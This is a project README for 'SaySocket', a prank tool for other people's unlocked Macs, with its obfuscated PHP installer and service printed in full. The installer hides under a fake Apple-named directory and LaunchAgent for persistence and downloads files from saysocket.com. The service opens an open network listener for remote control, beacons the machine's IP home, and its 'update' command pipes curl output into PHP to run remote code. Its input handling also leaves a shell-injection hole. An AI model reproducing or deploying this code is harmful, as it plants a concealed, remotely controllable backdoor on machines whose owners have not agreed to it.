# SaySocket
Have friends who own a Mac? Do they leave it unlocked? Give life to their Mac, make it speak!

Visit [saysocket.com](http://saysocket.com) to try it now!

### The Pieces
* The `say` command.
  * `say` is a text-to-speech command available on OSX
* PHP 5
  * PHP 5+ comes pre-installed on recent versions of OSX

### The Goal
* Build a service wrapper to access `say` command remotely

### The Reason
* It's fucking hilarious

### The Details
* This was built with little to no design effort. Shit popped into my head, and was added to this project.
* This project utilizes my other useless PHP project [PHPuny](https://github.com/5290charlie/PHPuny)
* [PHPuny](https://github.com/5290charlie/PHPuny) is a PHP minifier
* Ya, I know [minifying PHP is essentially pointless](http://stackoverflow.com/questions/4079920/is-there-a-point-to-minifying-php)
* The purpose of minifying the SaySocket code, is to make it as obscure as possible
* Obfuscation gets even more ridiculous, all (most) strings are reverse-base64 encoded
  * **Example:** The string `poop` will be represented as `base64_decode('cG9vcA==')`

### The Result
* The resulting files look like this:
  * __Installer:__
  ```php
  <?php
  define('CN','xxxxxxxxx');define('CO',$_SERVER['HOME']);define('CP',base64_decode('LkFwcGxlU3lzdGVtTW9uaXRvcg=='));define('CQ',CO.'/'.CP);define('CR',CQ.'/'.base64_decode('Ymlu'));define('CS',CR.'/'.base64_decode('Y3Rs'));define('CT',CR.'/'.base64_decode('bW9uaXRvcg=='));define('CU',CO.'/'.base64_decode('TGlicmFyeS9MYXVuY2hBZ2VudHM=').'/'.base64_decode('Y29tLmFwcGxlLnN5c3RlbS5tb25pdG9y').'.plist');define('CV',CO.'/'.base64_decode('LmJpbg=='));define('CW',preg_quote(CV,'/'));define('CX',CV.'/'.base64_decode('c3NfaW5zdGFsbA=='));define('CY',CV.'/'.base64_decode('c3NfcmVtb3Zl'));if(trim(CN)==''){die();}$va=base64_decode('LmJhc2hfcHJvZmlsZQ==');$vb=array(base64_decode('LnpzaHJj'));foreach($vb as $vc){if(file_exists(CO."/$vc")){$va=$vc;}}define('CZ',CO."/$va");if(!file_exists(CZ)||!preg_match('/PATH.*'.CW.'/',file_get_contents(CZ))){exec('echo "export PATH=\$'.'PATH:'.CV.'" >> '.CZ);}$vd=array(CQ,CR,CV);foreach($vd as $ve){if(!is_dir($ve)){mkdir($ve);}}if(!file_exists(CS)){copy(base64_decode('L3Vzci9iaW4vcGhw'),CS);}copy(__FILE__,CX);$vf=array('r'=>CY,'g'=>CT,'l'=>CU);foreach($vf as $vg=>$vh){exec('curl -s -o '.$vh.' '.base64_decode('aHR0cDovL3NheXNvY2tldC5jb20v').$vg.'.php?h='.CN);}$vi=array(CU=>array('{{MONITOR}}'=>CT,'{{BINARY_LOCATION}}'=>CS));foreach($vi as $vh=>$vj){$vk=file_get_contents($vh);foreach($vj as $vl=>$vm){$vk=str_replace($vl,$vm,$vk);}file_put_contents($vh,$vk);}exec('chmod +x '.CS.' '.CX.' '.CY.' '.CT);exec('launchctl load '.CU);
  ```
  * __Service:__
  ```php
  <?php
  define('CAJ',base64_decode('L14oKFswLTldfFsxLTldWzAtOV18MVswLTldezJ9fDJbMC00XVswLTldfDI1WzAtNV0pXC4pezN9KFswLTldfFsxLTldWzAtOV18MVswLTldezJ9fDJbMC00XVswLTldfDI1WzAtNV0pJC8='));define('CAK',base64_decode('L15bYS16QS1aMC05XHMsJ1wuXSskLw=='));define('CAL',base64_decode('L15xdWl0fGV4aXR8c2h1dGRvd24kL2k='));define('CAM',base64_decode('L151cGRhdGUkL2k='));define('CAN',base64_decode('L15yaWNrcm9sbCQvaQ=='));define('CAO',base64_decode('L152b2ljZXMkL2k='));define('CAP',base64_decode('L152b2ljZSQvaQ=='));define('CAQ',base64_decode('L152b2ljZSAoW2Etel0rKSQvaQ=='));define('CAR',base64_decode('L152b2x1bWUgKFxkKSQvaQ=='));define('CAS',base64_decode('MTAyNA=='));define('CAT',base64_decode('NjU1MzU='));define('CAU',base64_decode('MTIzNDU='));define('CAV',base64_decode('c2F5PiA='));if($vh=fd($argv[0])){exec("kill $vh");}$vi=fc();$vj=count($vi)>0?$vi[0]:base64_decode('YWxleA==');set_time_limit(0);ob_implicit_flush();$vk='0.0.0.0';$vl=CAU;global $vm;$vm=array(base64_decode('aXA=')=>fb(),base64_decode('cG9ydA==')=>$vl,base64_decode('aA==')=>'xxxxxxxxx');(preg_match(CAJ,$vk))or die();(is_numeric($vl)&&$vl>CAS&&$vl<CAT)or die();if(($vn=socket_create(AF_INET,SOCK_STREAM,SOL_TCP))===false){die();}socket_set_option($vn,SOL_SOCKET,SO_REUSEADDR,1);socket_set_option($vn,SOL_SOCKET,SO_REUSEPORT,1);if(socket_bind($vn,$vk,$vl)===false){socket_shutdown($vn);socket_close($vn);die();}if(socket_listen($vn,5)===false){socket_shutdown($vn);socket_close($vn);die();}exec(fe('m'));do{if(($vo=socket_accept($vn))===false){socket_shutdown($vn);socket_close($vn);break;}$vp=base64_decode('DQogX19fXyAgICAgICAgICAgICAgICBfX19fICAgICAgICAgICAgIF8gICAgICAgIF8NCi8gX19ffCAgX18gXyBfICAgXyAgLyBfX198ICBfX18gICBfX198IHwgX19fX198IHxfDQpcX19fIFwgLyBfYCB8IHwgfCB8IFxfX18gXCAvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wNCiBfX18pIHwgKF98IHwgfF98IHwgIF9fXykgfCAoXykgfCAoX198ICAgPCAgX18vIHxfDQp8X19fXy8gXF9fLF98XF9fLCB8IHxfX19fLyBcX19fLyBcX19ffF98XF9cX19ffFxfX3wNCiAgICAgICAgICAgICB8X19fLw0KDQpUeXBlIGFueXRoaW5nIHRvIHNheSBpdCB0aHJvdWdoIHRoZSBzb2NrZXQuDQpUbyBxdWl0LCB0eXBlICdxdWl0JywgJ2V4aXQnLCBvciAnc2h1dGRvd24nLg0K').CAV;socket_write($vo,$vp,strlen($vp));do{$vp='';if(false===($vq=socket_read($vo,2048,PHP_NORMAL_READ))){break;}if(!$vq=trim($vq)){continue;}$vq=trim(strtolower($vq),' _-[]()"\'');if(preg_match(CAL,$vq)){break;}else if(preg_match(CAM,$vq)){exec(base64_decode('cGhwIDwoY3VybCAtcyAiaHR0cDovL3NheXNvY2tldC5jb20vaS5waHA/aD1mYmJjNTNlYjc5MGRhYjE3IikK'));die();}else if(preg_match(CAN,$vq)){fg(7);ff(base64_decode('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vSGc1U0pZUkhBMA=='));}else if(preg_match(CAO,$vq)){foreach($vi as $vr){$vp.=$vr."\r\n";}}else if(preg_match(CAP,$vq,$vs)||preg_match(CAQ,$vq,$vs)){if(isset($vs[1])){$vr=$vs[1];if(in_array($vr,$vi)){$vj=$vr;}else{$vp.=base64_decode('Vm9pY2UgZG9lcyBub3QgZXhpc3QuIFVzZSAndm9pY2VzJyBjb21tYW5kIHRvIHNlZSBhIGxpc3Qgb2YgYXZhaWxhYmxlIHZvaWNlcw0K');}}$vp.=base64_decode('Q3VycmVudCB2b2ljZSBpczo=')." $vj\r\n";}else if(preg_match(CAR,$vq,$vs)){if(isset($vs[1])&&is_numeric($vs[1])){fg($vs[1]);}}else if(preg_match(CAK,$vq)){if(!fa($vq)){$vt=base64_decode('c2F5IC12')." $vj '$vq'";exec($vt);}else{$vp.=base64_decode('Q2Fubm90IHNheTo=')." '$vq', ".base64_decode('Y29tbWFuZCBleGlzdHMNCg==');}}else{$vp.=base64_decode('Q2Fubm90IHNheTo=')." '$vq', ".base64_decode('c3RyaW5nIGlzIHRvbyBjb21wbGV4DQo=');}$vp.=CAV;socket_write($vo,$vp,strlen($vp));}while(true);socket_close($vo);}while(true);function fa($vt){$vu=shell_exec(base64_decode('d2hpY2g=')." $vt");return(empty($vu)?false:true);}function fb(){for($vv=0;$vv<10;$vv++){$vt=base64_decode('aXBjb25maWc=').' '.base64_decode('Z2V0aWZhZGRy').' '.base64_decode('ZW4=').$vv;$vw=trim(exec($vt));if(preg_match(CAJ,$vw)){return $vw;}}return(base64_decode('MTI3LjAuMC4x'));}function fc(){$vi=array();$vt=base64_decode('c2F5IC12')." '?'";$vx=`$vt`;$vs=explode("\n",$vx);foreach($vs as $vy){$vz=explode(' ',$vy);if(isset($vz[0])){$vr=strtolower(trim($vz[0]));if($vr!=''){$vi[]=strtolower(trim($vz[0]));}}}return $vi;}function fd($vaa){$vt=base64_decode('cHMgYXV4');$vab=`$vt`;$vac=false;$vad='#'.get_current_user().'\s+(\d+)\s+.*'.preg_quote($vaa).'$#';foreach(explode("\n",$vab)as $vae){$vae=trim($vae);if(preg_match_all($vad,$vae,$vaf)){if(isset($vaf[1][0])){$vh=$vaf[1][0];if($vh!=getmypid()){return $vh;}}}}return false;}function fe($vag='m'){global $vm;if(in_array($vag,array('m','p'))){$vah=base64_decode('aHR0cDovL3NheXNvY2tldC5jb20v')."{$vag}.php?";$vah.=http_build_query($vm);return(base64_decode('Y3VybCAtcw==')." '$vah'");}return false;}function ff($vah){$vt=base64_decode('b3Blbg==').' "'.$vah.'"';exec($vt);}function fg($vai){if(is_numeric($vai)){$vai=(int)$vai;if($vai>9)$vai=9;if($vai<0)$vai=0;$vt=base64_decode('b3Nhc2NyaXB0IC1l').' "'.base64_decode('c2V0IFZvbHVtZQ==').' '.$vai.'"';exec($vt);}}
  ```
